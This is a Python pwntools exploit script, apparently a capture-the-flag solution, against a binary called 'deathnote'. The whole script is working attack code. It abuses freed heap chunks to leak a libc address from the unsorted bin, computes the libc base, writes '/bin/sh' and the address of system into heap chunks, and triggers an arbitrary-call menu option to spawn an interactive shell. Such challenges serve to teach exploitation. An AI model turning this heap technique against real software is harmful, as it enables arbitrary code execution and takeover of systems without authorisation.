#!/usr/bin/python3
from pwn import *
from time import sleep

elf = context.binary = ELF("deathnote", checksec=True)
libc = elf.libc
#context.log_level = "debug"
context.log_level = "critical"

gs = """
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()


class ProgramInteraction:
    @staticmethod
    def add(size, indx, data):
        io.sendlineafter(b" ", b"1")
        io.sendlineafter(b" ", str(size).encode())
        io.sendlineafter(b" ", str(indx).encode())
        io.sendlineafter(b" ", data)

    @staticmethod
    def free(indx):
        io.sendlineafter(b" ", b"2")
        io.sendlineafter(b" ", str(indx).encode())

    @staticmethod
    def show(indx) -> int:
        io.sendlineafter(b" ", b"3")
        io.sendlineafter(b" ", str(indx).encode())
        io.recvuntil(b"Page content: ")
        leak = io.recvline().strip()
        leak = u64(leak.ljust(8, b"\x00"))
        return leak

    


if __name__ == "__main__":
    program = ProgramInteraction()
    for i in range(9):                    # allocate 9 chunks 
        program.add(0x80, i, b"A"*0x80)   # this will be to fill up tcache and get a chunk for consolidation and a victim chunk

    program.add(0x10, 9, b"B"*0x10)       # anti consolidation chunk

    # cause chunk overlapping
    for i in range(7):                    # free all 7 chunks
        program.free(i)                   # free the tcache, next chunk freed with same size will be fastbin

    program.free(7)                       # free victim chunk
    program.free(8)                       # free consolidation chunk and boom unsortedbin

    unsortedbin = program.show(7)
    libc.address = unsortedbin - 0x21ace0               # unsortedbin leak - offset from libc
    log.info(f"rebased libc @ {libc.address:08x}")


    for i in range(5):                           # heap spray
        program.add(0x80, 0, chr(0x41+i) * 8)    # so that we can get /bin/sh into RDI for system

    program.add(0x80, 0, b"/bin/sh")                # /bin/sh into RDI
    program.add(0x80, 0, hex(libc.sym.system)[2:])  # system into RIP since we can call any address, and we convert it to a hex string to bypass checks
    io.sendlineafter(b" ",b"42")                    # call the arbitrary call function
    io.interactive()
